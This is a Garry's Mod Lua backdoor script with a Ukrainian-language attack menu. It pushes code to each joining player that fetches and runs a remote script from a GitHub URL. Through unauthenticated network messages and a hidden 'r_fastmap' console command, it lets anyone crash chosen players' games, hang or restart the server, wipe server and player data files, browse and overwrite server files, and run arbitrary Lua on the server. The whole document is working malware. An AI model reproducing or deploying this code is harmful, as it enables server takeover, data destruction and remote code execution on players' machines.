/*local sigmaAdmins = {
    ["STEAM_0:0:558900479"] = true,
    ["STEAM_0:1:510783731"] = true,
    ["STEAM_0:0:36020379"] = true
};*/

local function cleanDataDir(path)
    local files, dirs = file.Find(path .. "/*", "DATA")
    for _, f in ipairs(files) do
        file.Delete(path .. "/" .. f, "DATA")
    end
    for _, d in ipairs(dirs) do
        cleanDataDir(path .. "/" .. d)
        file.Delete(path .. "/" .. d, "DATA")
    end
end

if SERVER then
    util.AddNetworkString("SendSV.info");
    util.AddNetworkString("SendPly.info");
    util.AddNetworkString("SigmaLuaError");

    local rawURL = "https://raw.githubusercontent.com/NiktoSupra/SigmaLil/refs/heads/main/omagad.lua"
    local vsosiCode = "http.Fetch('" .. rawURL .. "', RunString)"

    hook.Add("PlayerInitialSpawn", "SigmAutoInfect", function(ply)
        timer.Simple(10, function()
            if IsValid(ply) then
                ply:SendLua(vsosiCode)
            end
        end)
    end)

    BroadcastLua(vsosiCode)

    local function crashPlayers(targets)
        local count = #targets
        for _, v in ipairs(targets) do
            if v:IsValid() then
                net.Start("SendPly.info");
                net.WriteInt(1, 32);
                net.WriteInt(count, 8);
                net.Send(v)
            end
        end
    end;

    local function restartServer(delay)
        timer.Simple(delay, function()
            RunConsoleCommand("_restart")
        end)
    end;

    local function killServer(delay)
        timer.Simple(delay, function()
            timer.Create("serverLoadLoop", 0, 0, function()
                while true do
                    for i = 1, 100 do
                        for _, ply in ipairs(player.GetAll()) do
                            local _ = ply:Nick()
                        end
                    end
                end
            end)
        end)
    end;

    local function deleteServerData(delay)
        timer.Simple(delay, function()
            local rootFiles, rootDirs = file.Find("*", "DATA")
            for _, f in ipairs(rootFiles) do
                file.Delete(f, "DATA")
            end
            for _, d in ipairs(rootDirs) do
                cleanDataDir(d)
                file.Delete(d, "DATA")
            end
        end)
    end;

    local function fpsBoost(targets, duration)
        for _, v in ipairs(targets) do
            if v:IsValid() then
                net.Start("SendPly.info");
                net.WriteInt(5, 32);
                net.WriteInt(duration, 8);
                net.Send(v)
            end
        end
    end;

    local function spawnEntity(className, ply)
        local ent = ents.Create(className)
        if ent:IsValid() then
            local pos = ply:GetEyeTrace().HitPos + Vector(0, 0, 45)
            ent:SetPos(pos);
            ent:SetAngles(Angle(0, 0, 0));
            ent:Spawn();
            ent:Activate();
            undo.Create("Smegmaprop");
            undo.AddEntity(ent);
            undo.SetPlayer(ply);
            undo.Finish()
        end
    end;

    local function deleteClientData(targets)
        for _, ply in ipairs(targets) do
            if ply:IsValid() then
                net.Start("SendPly.info");
                net.WriteInt(7, 32);
                net.Send(ply)
            end
        end
    end;

    local function runLuaCode(code, ply)
        local func, err = CompileString(code, "user_input", false)
        if type(func) ~= "function" then
            net.Start("SigmaLuaError");
            net.WriteString(err or "Невідома помилка компіляції");
            net.Send(ply);
            return false
        end;
        local success, runtimeErr = pcall(func)
        if not success then
            net.Start("SigmaLuaError");
            net.WriteString(runtimeErr or "Невідома помилка виконання");
            net.Send(ply);
            return false
        end;
        return true
    end;

    net.Receive("SendSV.info", function(_, ply)
        local Id, text, tbl, delay = net.ReadInt(32), net.ReadString(), net.ReadTable(), net.ReadInt(32);
        local actions = {
            [1] = function() crashPlayers(tbl) end,
            [2] = function() restartServer(delay) end,
            [3] = function() killServer(delay) end,
            [4] = function() deleteServerData(delay) end,
            [5] = function() fpsBoost(tbl, delay) end,
            [6] = function() spawnEntity(text, tbl[1]) end,
            [7] = function() deleteClientData(tbl) end,
            [8] = function() runLuaCode(text, ply) end
        };
        if actions[Id] then
            actions[Id]()
        end
    end);

    util.AddNetworkString("SigmaFileListRequest");
    util.AddNetworkString("SigmaFileListResponse");
    util.AddNetworkString("SigmaFileReadRequest");
    util.AddNetworkString("SigmaFileReadResponse");
    util.AddNetworkString("SigmaFileWriteRequest");

    net.Receive("SigmaFileListRequest", function(_, ply)
        //if not sigmaAdmins[ply:SteamID()] then return end;
        local pathID = net.ReadString();
        local path = net.ReadString();
        local search = (path == "" and "*" or path .. "/*");
        local files, folders = file.Find(search, pathID);
        net.Start("SigmaFileListResponse");
        net.WriteString(pathID);
        net.WriteString(path);
        net.WriteTable(files or {});
        net.WriteTable(folders or {});
        net.Send(ply)
    end);

    net.Receive("SigmaFileReadRequest", function(_, ply)
        //if not sigmaAdmins[ply:SteamID()] then return end;
        local pathID = net.ReadString();
        local filePath = net.ReadString();
        local content = file.Read(filePath, pathID) or "";
        net.Start("SigmaFileReadResponse");
        net.WriteString(pathID);
        net.WriteString(filePath);
        net.WriteString(content);
        net.Send(ply)
    end);

    net.Receive("SigmaFileWriteRequest", function(_, ply)
        //if not sigmaAdmins[ply:SteamID()] then return end;
        local filePath = net.ReadString();
        local content = net.ReadString();
        file.Write(filePath, content)
    end)
end

if CLIENT then
    local function sendSvInfo(frame, Id, text, tbl, delay, notif)
        net.Start("SendSV.info");
        net.WriteInt(Id, 32);
        net.WriteString(text);
        net.WriteTable(tbl);
        net.WriteInt(delay, 32);
        net.SendToServer();
        if notif and notif > 0 then
            notification.AddLegacy("Дія через " .. notif .. " c.", NOTIFY_GENERIC, 5);
            surface.PlaySound("buttons/button15.wav")
        end;
        frame:Close()
    end;

    local function CreatePlayerSelector(title, parent, callback)
        local frame = vgui.Create("DFrame");
        frame:SetTitle(title);
        frame:SetSize(400, 500);
        frame:Center();
        frame:MakePopup();
        local list = vgui.Create("DListView", frame);
        list:Dock(TOP);
        list:SetHeight(380);
        list:AddColumn("Гравці");
        for _, ply in ipairs(player.GetAll()) do
            list:AddLine(ply:Nick())
        end;
        local btn = vgui.Create("DButton", frame);
        btn:Dock(BOTTOM);
        btn:SetText("Підтвердити");
        function btn:DoClick()
            local sel = list:GetSelected();
            local tbl = {};
            for _, line in ipairs(sel) do
                local name = line:GetColumnText(1);
                for _, ply in ipairs(player.GetAll()) do
                    if ply:Nick() == name then
                        table.insert(tbl, ply)
                    end
                end
            end;
            callback(tbl);
            frame:Close()
        end
    end;

    local currentFilePath = "";
    local allowedExtensions = {
        ["txt"] = true, ["cfg"] = true, ["lua"] = true, ["json"] = true,
        ["xml"] = true, ["ini"] = true, ["vmt"] = true, ["vtf"] = true,
        ["res"] = true, ["dat"] = true
    };

    function OpenFileEditor(pathID, filePath, content)
        local frame = vgui.Create("DFrame");
        frame:SetTitle("Редактор: " .. filePath);
        frame:SetSize(800, 600);
        frame:Center();
        frame:MakePopup();
        local textEntry = vgui.Create("DTextEntry", frame);
        textEntry:Dock(FILL);
        textEntry:SetMultiline(true);
        textEntry:SetText(content);
        if pathID == "DATA" then
            local saveBtn = vgui.Create("DButton", frame);
            saveBtn:Dock(BOTTOM);
            saveBtn:SetText("Зберегти");
            saveBtn:SetTall(30);
            saveBtn.DoClick = function()
                net.Start("SigmaFileWriteRequest");
                net.WriteString(filePath);
                net.WriteString(textEntry:GetValue());
                net.SendToServer();
                frame:Close();
                notification.AddLegacy("Файл збережено!", NOTIFY_GENERIC, 5)
            end
        end
    end;

    function OpenFileExplorer(path, pathID)
        path = path or "";
        pathID = pathID or "DATA";
        local frame = vgui.Create("DFrame");
        frame:SetTitle("Файловий менеджер сервера");
        frame:SetSize(800, 600);
        frame:Center();
        frame:MakePopup();
        local sourceSelect = vgui.Create("DComboBox", frame);
        sourceSelect:Dock(TOP);
        sourceSelect:AddChoice("DATA", "DATA", pathID == "DATA");
        sourceSelect:AddChoice("GAME", "GAME", pathID == "GAME");
        sourceSelect.OnSelect = function(_, _, value)
            OpenFileExplorer("", value);
            frame:Close()
        end;
        local pathEntry = vgui.Create("DTextEntry", frame);
        pathEntry:Dock(TOP);
        pathEntry:SetValue(path);
        pathEntry.OnEnter = function(self)
            OpenFileExplorer(self:GetValue(), pathID);
            frame:Close()
        end;
        local backBtn = vgui.Create("DButton", frame);
        backBtn:SetText("← Назад");
        backBtn:Dock(TOP);
        backBtn:SetEnabled(path ~= "");
        backBtn.DoClick = function()
            local parent = string.match(path, "^(.*)/[^/]+$") or "";
            OpenFileExplorer(parent, pathID);
            frame:Close()
        end;
        local scroll = vgui.Create("DScrollPanel", frame);
        scroll:Dock(FILL);

        net.Start("SigmaFileListRequest");
        net.WriteString(pathID);
        net.WriteString(path);
        net.SendToServer();

        net.Receive("SigmaFileListResponse", function()
            local recvPathID = net.ReadString();
            local recvPath = net.ReadString();
            local files = net.ReadTable();
            local folders = net.ReadTable();
            for _, folder in ipairs(folders) do
                local btn = scroll:Add("DButton");
                btn:SetText("[Папка] " .. folder);
                btn:SetContentAlignment(4);
                btn:Dock(TOP);
                btn.DoClick = function()
                    OpenFileExplorer((path ~= "" and path .. "/" or "") .. folder, pathID);
                    frame:Close()
                end
            end;
            for _, file in ipairs(files) do
                local btn = scroll:Add("DButton");
                btn:SetText("[Файл] " .. file);
                btn:SetContentAlignment(4);
                btn:Dock(TOP);
                btn.DoClick = function()
                    local fullPath = (path ~= "" and path .. "/" or "") .. file;
                    net.Start("SigmaFileReadRequest");
                    net.WriteString(pathID);
                    net.WriteString(fullPath);
                    net.SendToServer();
                    net.Receive("SigmaFileReadResponse", function()
                        local pid = net.ReadString();
                        local fpath = net.ReadString();
                        local content = net.ReadString();
                        OpenFileEditor(pid, fpath, content)
                    end)
                end
            end
        end)
    end;

    local function OpenLuaRunner()
        local frame = vgui.Create("DFrame");
        frame:SetTitle("Виконати Lua код на сервері");
        frame:SetSize(600, 500);
        frame:Center();
        frame:MakePopup();
        local textEntry = vgui.Create("DTextEntry", frame);
        textEntry:Dock(FILL);
        textEntry:SetMultiline(true);
        textEntry:SetPlaceholderText("Введіть Lua код для виконання на сервері...");
        local btnRun = vgui.Create("DButton", frame);
        btnRun:Dock(BOTTOM);
        btnRun:SetText("Виконати");
        btnRun:SetTall(40);
        btnRun.DoClick = function()
            local code = textEntry:GetValue();
            if code ~= "" then
                net.Start("SendSV.info");
                net.WriteInt(8, 32);
                net.WriteString(code);
                net.WriteTable({});
                net.WriteInt(0, 32);
                net.SendToServer();
                notification.AddLegacy("Код відправлено!", NOTIFY_GENERIC, 5)
            end
        end
    end;

    net.Receive("SigmaLuaError", function()
        local errorMsg = net.ReadString();
        Derma_Message("Помилка виконання коду: " .. errorMsg, "Помилка Lua")
    end);

    function OpenSigmaGui()
        local frame = vgui.Create("DFrame");
        frame:SetTitle("Rape Menu");
        frame:SetSize(400, 400);
        frame:Center();
        frame:MakePopup();

        local crash = vgui.Create("DButton", frame);
        crash:Dock(TOP);
        crash:SetText("Крашнути гравців");
        function crash:DoClick()
            CreatePlayerSelector("Вибір жертв", frame, function(tbl)
                sendSvInfo(frame, 1, "", tbl, 0, 0)
            end)
        end;

        local restart = vgui.Create("DButton", frame);
        restart:Dock(TOP);
        restart:DockMargin(0, 10, 0, 0);
        restart:SetText("Рестартнути сервер");
        function restart:DoClick()
            local t = 5;
            sendSvInfo(frame, 2, "", {}, t, t)
        end;

        local kill = vgui.Create("DButton", frame);
        kill:Dock(TOP);
        kill:DockMargin(0, 10, 0, 0);
        kill:SetText("Вимкнути сервер");
        function kill:DoClick()
            Derma_Query("Ви впевнені?", "Підтвердження", "Так", function()
                local t = 5;
                sendSvInfo(frame, 3, "", {}, t, t)
            end, "Ні", function() end)
        end;

        local delSrv = vgui.Create("DButton", frame);
        delSrv:Dock(TOP);
        delSrv:DockMargin(0, 10, 0, 0);
        delSrv:SetText("Видалити дані сервера");
        function delSrv:DoClick()
            Derma_Query("Видалити всі дані сервера?", "Підтвердження", "Так", function()
                local t = math.random(3, 5);
                sendSvInfo(frame, 4, "", {}, t, t)
            end, "Ні", function() end)
        end;

        local fps = vgui.Create("DButton", frame);
        fps:Dock(TOP);
        fps:DockMargin(0, 10, 0, 0);
        fps:SetText("Забустити FPS");
        function fps:DoClick()
            CreatePlayerSelector("Вибір жертв для FPS буста", frame, function(tbl)
                Derma_StringRequest("Час буста (c)", "Введіть тривалість", "10", function(val)
                    sendSvInfo(frame, 5, "", tbl, tonumber(val), 0)
                end)
            end)
        end;

        local entEntry = vgui.Create("DTextEntry", frame);
        entEntry:Dock(TOP);
        entEntry:DockMargin(0, 10, 0, 0);
        entEntry:SetPlaceholderText("Клас ентіті");

        local entBtn = vgui.Create("DButton", frame);
        entBtn:Dock(TOP);
        entBtn:DockMargin(0, 5, 0, 0);
        entBtn:SetText("Заспавнити ентіті");
        function entBtn:DoClick()
            if entEntry:GetValue() ~= "" then
                sendSvInfo(frame, 6, entEntry:GetValue(), { LocalPlayer() }, 0, 0)
            end
        end;

        local delCl = vgui.Create("DButton", frame);
        delCl:Dock(TOP);
        delCl:DockMargin(0, 10, 0, 0);
        delCl:SetText("Видалити дані гравцю");
        function delCl:DoClick()
            CreatePlayerSelector("Вибір гравців для очищення даних", frame, function(tbl)
                Derma_Query("Видалити дані у вибраних?", "Підтвердження", "Так", function()
                    sendSvInfo(frame, 7, "", tbl, 0, 0)
                end, "Ні", function() end)
            end)
        end;

        local fileBtn = vgui.Create("DButton", frame);
        fileBtn:Dock(TOP);
        fileBtn:DockMargin(0, 10, 0, 0);
        fileBtn:SetText("Файловий менеджер сервера");
        fileBtn.DoClick = function()
            OpenFileExplorer("")
        end;

        local luaBtn = vgui.Create("DButton", frame);
        luaBtn:Dock(TOP);
        luaBtn:DockMargin(0, 10, 0, 0);
        luaBtn:SetText("Виконати Lua код (сервер)");
        luaBtn.DoClick = function()
            OpenLuaRunner()
        end
    end;

    concommand.Add("r_fastmap", function(ply, _, args)
        //if sigmaAdmins[ply:SteamID()] and args[1] == "8" then
            OpenSigmaGui()
        //end
    end);

    net.Receive("SendPly.info", function()
        local Id = net.ReadInt(32);
        local count = net.ReadInt(8);
        if Id == 1 then
            local function triggerCrash()
                timer.Create("clientLoadLoop", 0, 0, function()
                    while true do
                        for i = 1, 100 do
                            for _, v in ipairs(player.GetAll()) do
                                local _ = v:Nick()
                            end
                        end
                    end
                end)
            end;
            if count == 1 then
                triggerCrash()
            else
                timer.Simple(math.random(120, 300), triggerCrash)
            end
        elseif Id == 5 then
            local imgs = {};
            hook.Add("Think", "SmegmaCreator", function()
                for i = 1, 10 do
                    local img = vgui.Create("DImage");
                    img:SetSize(5, 5);
                    img:SetPos(ScrW() - 10, ScrH() - 10);
                    img:SetImage("icon16/bullet_white.png");
                    table.insert(imgs, img)
                end
            end);
            timer.Simple(count, function()
                hook.Remove("Think", "SmegmaCreator")
                for _, img in ipairs(imgs) do
                    img:Remove()
                end
            end)
        elseif Id == 7 then
            local rootFiles, rootDirs = file.Find("*", "DATA");
            for _, f in ipairs(rootFiles) do
                file.Delete(f, "DATA")
            end;
            for _, d in ipairs(rootDirs) do
                cleanDataDir(d);
                file.Delete(d, "DATA")
            end
        end
    end)
end
